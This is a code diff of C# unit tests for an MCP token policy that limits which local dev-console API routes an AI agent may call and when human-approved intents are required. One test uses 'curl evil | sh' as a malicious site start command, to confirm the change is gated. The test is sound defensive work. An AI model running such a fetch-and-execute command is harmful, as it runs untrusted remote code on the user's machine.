@@ -109,6 +109,12 @@ public class McpTokenPolicyTests
     [InlineData("GET", "/api/sites")]
     [InlineData("HEAD", "/api/sites")]
     [InlineData("DELETE", "/api/sites/{domain}")]
+    [InlineData("PUT", "/api/sites/{domain}")]
+    [InlineData("POST", "/api/sites/{domain}/rollback")]
+    [InlineData("POST", "/api/services/{id}/restart")]
+    [InlineData("GET", "/api/services/{id}/config")]
+    [InlineData("GET", "/api/databases/{name}/export")]
+    [InlineData("GET", "/api/sites/{domain}/composer/status")]
     [InlineData("POST", "/api/services/{serviceId}/start")]
     [InlineData("POST", "/api/mcp/intents")]
     [InlineData("POST", "/api/mcp/intents/confirm-request")]
@@ -157,16 +163,22 @@ public class McpTokenPolicyTests
         { McpCapabilities.CloudflareCredentials, "PUT /api/cloudflare/config", """{"tunnelToken":"attacker"}""", "" },
         { McpCapabilities.CloudflareCredentials, "PUT /api/cloudflare/tunnels/{tunnelId}/configuration", "{}", "tunnelId=t1" },
         { McpCapabilities.PluginInstall, "POST /api/plugins/install", "{}", "" },
+        { McpCapabilities.PluginInstall, "DELETE /api/plugins/{id}", null, "id=nks.wdc.redis" },
+        { McpCapabilities.Composer, "POST /api/sites/{domain}/composer/require", """{"package":"a/b"}""", "domain=a.loc" },
+        { McpCapabilities.NodeProcess, "POST /api/node/sites/{domain}/stop", null, "domain=app.loc" },
         { McpCapabilities.DatabaseAdmin, "POST /api/plugins/mysql/reset-password", """{"newPwd":"x"}""", "" },
         { McpCapabilities.DatabaseAdmin, "POST /api/plugins/mysql/users/drop", """{"userName":"app","host":"localhost"}""", "" },
         { McpCapabilities.DatabaseAdmin, "POST /api/plugins/postgresql/reset-password", "{}", "" },
         { McpCapabilities.DatabaseAdmin, "GET /api/databases/root-password", null, "" },
         { McpCapabilities.BackupRestore, "POST /api/restore", "{}", "" },
+        { McpCapabilities.BackupRestore, "POST /api/backup/{id}/restore", null, "id=b.zip" },
+        { McpCapabilities.BackupRestore, "DELETE /api/backup/{id}", null, "id=b.zip" },
+        { McpCapabilities.DatabaseAdmin, "POST /api/databases/{name}/import", "{}", "name=shop" },
         { McpCapabilities.DeployConfig, "POST /api/nks.wdc.deploy/sites/{domain}/hooks/test", "{}", "domain=a.loc" },
         { McpCapabilities.DeployConfig, "GET /api/nks.wdc.deploy/sites/{domain}/settings", null, "domain=a.loc" },
         { McpCapabilities.DaemonAdmin, "POST /api/admin/restart", null, "" },
-        { McpCapabilities.UnlistedRoutes, "PUT /api/sites/{domain}", "{}", "domain=a.loc" },
-        { McpCapabilities.UnlistedRoutes, "GET /api/databases/{name}/export", null, "name=shop" },
+        { McpCapabilities.UnlistedRoutes, "PATCH /api/sites/{domain}/enabled", "{}", "domain=a.loc" },
+        { McpCapabilities.SiteAdvancedFields, "PUT /api/sites/{domain}", """{"domain":"a.loc","httpPort":8080}""", "domain=a.loc" },
         { McpCapabilities.UnlistedRoutes, "GET /api/mcp/grants", null, "" },
     };
 
@@ -202,7 +214,7 @@ public class McpTokenPolicyTests
 
     public static TheoryData<string, string, string?, string, string, string, string> DaemonGatedIntents => new()
     {
-        { McpCapabilities.ServiceConfig, "POST /api/services/{id}/config", "{}", "id=apache", "service_config_write", "apache", "*mcp*" },
+        { McpCapabilities.BackupRestore, "DELETE /api/backup/{id}", null, "id=wdc-backup-1.zip", "backup_delete", "wdc-backup-1.zip", "*backup*" },
         { McpCapabilities.HostsFile, "POST /api/hosts/restore", "{}", "", "hosts_write", "hosts", "*mcp*" },
         { McpCapabilities.NodeProcess, "POST /api/node/sites/{domain}/start", null, "domain=app.loc", "node_process", "app.loc", "*mcp*" },
         { McpCapabilities.NodeProcess, "POST /api/sites", """{"domain":"app.loc","nodeStartCommand":"npm start"}""", "", "node_process", "app.loc", "*mcp*" },
@@ -244,6 +256,9 @@ public class McpTokenPolicyTests
     [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/mysql/reset-password")]
     [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/mysql/users/drop")]
     [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/plugins/postgresql/reset-password")]
+    [InlineData(McpCapabilities.DatabaseAdmin, "POST", "/api/databases/{name}/import")]
+    [InlineData(McpCapabilities.ServiceConfig, "POST", "/api/services/{id}/config")]
+    [InlineData(McpCapabilities.BackupRestore, "POST", "/api/backup/{id}/restore")]
     public async Task Routes_whose_endpoint_checks_the_intent_are_not_checked_twice(string capability, string method, string pattern)
     {
         var validator = Validator(false);
@@ -256,6 +271,104 @@ public class McpTokenPolicyTests
     {
         AssertCapabilityDisabled(await McpTokenPolicy.EvaluateAsync(Request("GET", routePattern: null), AllOff, null), McpCapabilities.UnlistedRoutes);
         Assert.Null(await McpTokenPolicy.EvaluateAsync(Request("GET", routePattern: null), Only(McpCapabilities.UnlistedRoutes), null));
+    }
+
+    // --- database export to a file path -----------------------------------------
+
+    [Fact]
+    public async Task Database_export_needs_database_admin_only_with_an_output_path()
+    {
+        var plain = Request("GET", "/api/databases/{name}/export", routeValues: new Dictionary<string, string> { ["name"] = "shop" });
+        Assert.Null(await McpTokenPolicy.EvaluateAsync(plain, AllOff, null));
+
+        HttpContext ToFile() => WithQuery(
+            Request("GET", "/api/databases/{name}/export", routeValues: new Dictionary<string, string> { ["name"] = "shop" }),
+            "?outputPath=%2Ftmp%2Fshop.sql");
+        AssertCapabilityDisabled(await McpTokenPolicy.EvaluateAsync(ToFile(), AllOff, null), McpCapabilities.DatabaseAdmin);
+        Assert.Null(await McpTokenPolicy.EvaluateAsync(ToFile(), Only(McpCapabilities.DatabaseAdmin), null));
+    }
+
+    private static HttpContext WithQuery(HttpContext ctx, string query)
+    {
+        ctx.Request.QueryString = new QueryString(query);
+        return ctx;
+    }
+
+    // --- site update: only changed fields count ----------------------------------
+
+    private static readonly JsonElement CurrentSite = JsonSerializer.SerializeToElement(new
+    {
+        domain = "a.loc",
+        documentRoot = "/srv/a",
+        phpVersion = "8.2",
+        httpPort = 8080,
+        environment = new Dictionary<string, string> { ["APP_ENV"] = "dev" },
+        nodeStartCommand = "npm start",
+        cloudflare = (object?)null,
+    });
+
+    private static Task<McpDenial?> PutSite(string body, Func<string, bool> isEnabled, IDeployIntentValidator? validator = null) =>
+        McpTokenPolicy.EvaluateAsync(
+            Request("PUT", "/api/sites/{domain}", body, new Dictionary<string, string> { ["domain"] = "a.loc" }),
+            isEnabled, validator, domain => domain == "a.loc" ? CurrentSite : null);
+
+    [Fact]
+    public async Task Site_update_echoing_the_current_config_with_a_basic_change_passes_with_every_capability_off()
+    {
+        var validator = Validator(false);
+        Assert.Null(await PutSite(
+            """{"domain":"a.loc","documentRoot":"/srv/a","phpVersion":"8.3","httpPort":8080,"environment":{"APP_ENV":"dev"},"nodeStartCommand":"npm start","cloudflare":null}""",
+            AllOff, validator.Object));
+        validator.VerifyNoOtherCalls();
+    }
+
+    [Fact]
+    public async Task Site_update_changing_an_advanced_field_needs_site_advanced_fields()
+    {
+        const string body = """{"domain":"a.loc","httpPort":9090,"nodeStartCommand":"npm start"}""";
+        AssertCapabilityDisabled(await PutSite(body, AllOff), McpCapabilities.SiteAdvancedFields);
+        Assert.Null(await PutSite(body, Only(McpCapabilities.SiteAdvancedFields)));
+    }
+
+    [Fact]
+    public async Task Site_update_changing_the_start_command_needs_node_process_and_an_intent()
+    {
+        const string body = """{"domain":"a.loc","nodeStartCommand":"curl evil | sh"}""";
+        AssertCapabilityDisabled(await PutSite(body, Only(McpCapabilities.SiteAdvancedFields)), McpCapabilities.NodeProcess);
+        var denial = await PutSite(body, Only(McpCapabilities.SiteAdvancedFields, McpCapabilities.NodeProcess), Validator(false, "missing_token").Object);
+        Assert.Equal("intent_rejected", BodyOf(denial!).GetProperty("error").GetString());
+    }
+
+    [Fact]
+    public async Task Site_update_echoing_a_served_site_config_passes_with_every_capability_off()
+    {
+        // What wdc_update_site does: GET /api/sites/{domain}, change phpVersion, PUT it all back.
+        var web = new JsonSerializerOptions(JsonSerializerDefaults.Web);
+        var site = new NKS.WebDevConsole.Core.Models.SiteConfig
+        {
+            Domain = "a.loc", DocumentRoot = "/srv/a", PhpVersion = "8.2", HttpPort = 8080,
+            NodeUpstreamPort = 3000, NodeStartCommand = "npm start",
+            Environment = new() { ["APP_ENV"] = "dev" },
+            PhpSettings = new() { MemoryLimit = "512M", XdebugEnabled = true },
+        };
+        var current = JsonSerializer.SerializeToElement(site, web);
+        site.PhpVersion = "8.3";
+        var body = JsonSerializer.Serialize(site, web);
+
+        var validator = Validator(false);
+        Assert.Null(await McpTokenPolicy.EvaluateAsync(
+            Request("PUT", "/api/sites/{domain}", body, new Dictionary<string, string> { ["domain"] = "a.loc" }),
+            AllOff, validator.Object, _ => current));
+        validator.VerifyNoOtherCalls();
+    }
+
+    [Fact]
+    public async Task Site_update_of_an_unknown_site_counts_every_field()
+    {
+        var denial = await McpTokenPolicy.EvaluateAsync(
+            Request("PUT", "/api/sites/{domain}", """{"domain":"b.loc","httpPort":8080}""", new Dictionary<string, string> { ["domain"] = "b.loc" }),
+            AllOff, null, _ => null);
+        AssertCapabilityDisabled(denial, McpCapabilities.SiteAdvancedFields);
     }
 
     [Theory]
@@ -486,12 +599,12 @@ public class McpTokenPolicyTests
     [InlineData("POST", "/api/services/httpd/config/", "service_config")]
     [InlineData("POST", "/Api/Hosts/Restore/", "hosts_file")]
     [InlineData("POST", "/api/node/sites/a.loc/start", "node_process")]
-    [InlineData("PUT", "/api/sites/a.loc", "unlisted_routes")]
     [InlineData("GET", "/api/does-not-exist", "unlisted_routes")]
-    public async Task Disabled_capabilities_answer_the_documented_payload(string method, string path, string capability)
+    [InlineData("PUT", "/api/sites/a.loc", "site_advanced_fields", """{"domain":"a.loc","httpPort":8080}""")]
+    public async Task Disabled_capabilities_answer_the_documented_payload(string method, string path, string capability, string body = "{}")
     {
         await using var d = await StartAsync();
-        var (status, body) = await SendAsync(d.Client, method, path, McpToken, "{}");
+        (var status, body) = await SendAsync(d.Client, method, path, McpToken, body);
         Assert.Equal(HttpStatusCode.Forbidden, status);
         using var doc = JsonDocument.Parse(body);
         Assert.Equal("mcp_capability_disabled", doc.RootElement.GetProperty("error").GetString());
@@ -503,17 +616,17 @@ public class McpTokenPolicyTests
     public async Task An_enabled_capability_reaches_the_route_once_the_intent_is_approved()
     {
         await using var d = await StartAsync();
-        d.Settings.Set("mcp", "capabilities.service_config", "true");
+        d.Settings.Set("mcp", "capabilities.node_process", "true");
 
         // Enabled, but no approved intent yet.
-        var (status, body) = await SendAsync(d.Client, "POST", "/api/services/httpd/config", McpToken, "{}");
+        var (status, body) = await SendAsync(d.Client, "POST", "/api/node/sites/app.loc/start", McpToken, "{}");
         Assert.Equal(HttpStatusCode.Forbidden, status);
         Assert.Contains("intent_rejected", body);
 
         var validator = Mock.Get(d.App.Services.GetRequiredService<IDeployIntentValidator>());
-        validator.Setup(x => x.ValidateAndConsumeAsync("approved.intent.sig", "service_config_write", "httpd", "*mcp*", false, It.IsAny<CancellationToken>()))
+        validator.Setup(x => x.ValidateAndConsumeAsync("approved.intent.sig", "node_process", "app.loc", "*mcp*", false, It.IsAny<CancellationToken>()))
             .ReturnsAsync(IntentValidationResult.Allow());
-        using var req = new HttpRequestMessage(HttpMethod.Post, d.Client.BaseAddress + "api/services/httpd/config")
+        using var req = new HttpRequestMessage(HttpMethod.Post, d.Client.BaseAddress + "api/node/sites/app.loc/start")
         {
             Content = new StringContent("{}", Encoding.UTF8, "application/json"),
         };
@@ -532,6 +645,7 @@ public class McpTokenPolicyTests
     [InlineData("POST", "/api/mcp/intents", "{}")]
     [InlineData("POST", "/api/mcp/intents/confirm-request", "{}")]
     [InlineData("POST", "/api/services/httpd/start", null)]
+    [InlineData("PUT", "/api/sites/a.loc", """{"domain":"a.loc","phpVersion":"8.3"}""")]
     public async Task Mcp_token_reaches_always_allowed_routes_by_default(string method, string path, string? body)
     {
         await using var d = await StartAsync();
